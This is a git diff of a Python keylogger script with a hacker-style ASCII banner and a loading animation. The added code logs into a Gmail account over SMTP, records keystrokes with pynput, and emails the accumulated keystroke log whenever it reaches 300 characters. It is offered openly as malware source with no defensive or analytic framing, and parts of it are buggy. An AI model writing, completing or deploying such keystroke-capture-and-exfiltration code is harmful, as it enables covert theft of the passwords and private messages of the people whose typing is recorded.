@@ -5,9 +5,10 @@ import sys
 
 import getpass
 import smtpd
-from pynput import Key, Listener
+import smtplib, ssl
+from pynput.keyboard import Key, Listener
 
-# f = open("F:\Projects\Keylogger\logo.txt", "r")
+# f = open("\logo.txt", "r")
 print('''
  ██ ▄█▀▓█████ ▓██   ██▓    ▄▄▄      ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀
  ██▄█▒ ▓█   ▀  ▒██  ██▒   ▒████▄    ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
@@ -25,7 +26,7 @@ print('''
 done = False
 #here is the animation
 def animate():
-    for c in itertools.cycle([ '█   ', '▓█  ', '▒▓█ ', '░▒▓█', ' ░▒▓', '  ▒▓', '   ▒', '    ', '    ' ]):
+    for c in itertools.cycle([ '          ', '█         ', '▓█        ', '▒▓█       ', '░▒▓█      ', ' ░▒▓█     ', '  ░▒▓█    ', '   ░▒▓█   ', '    ░▒▓█  ', '     ░▒▓█ ', '      ░▒▓█', '       ░▒▓', '        ░▒', '         ░','          ' ]):
         if done:
             break
         sys.stdout.write('\rLoading...   ' + c)
@@ -37,10 +38,52 @@ t = threading.Thread(target=animate)
 t.start()
 
 #long process here
-time.sleep(5)
+time.sleep(2)
 done = True
 
 
 #Email setup
+email=input('Enter your email address: ')
+password=getpass.getpass(prompt="Password: ", stream=None)
+server=smtplib.SMTP_SSL('smtp.gmail.com', 465)
+server.login(email, password)
 
+#Logger
+full_log=''
+word=''
+email_char_limit=300
 
+def on_press(key):
+    global word
+    global full_long
+    global email
+    global email_char_limit
+
+    if key==Key.space or key==Key.enter:
+        word+=''
+        full_log+=word
+        word=''
+        if len(full_log)>=email_char_limit:
+            send_log()
+            full_log=''
+    elif key==Key.shift_1 or key==Key.shift_r:
+        return
+    elif key==Key.backspace:
+        word=word[:-1]
+    else:
+        char=f'{key}'
+        char=char[1:-1]
+        word+=char
+        
+    if key==Key.esc:
+        return False
+
+def send_log():
+    server.sendmail(
+        email,
+        email,
+        full_log
+    )
+
+with Listener (on_press=on_press) as listener:
+    listener.join()
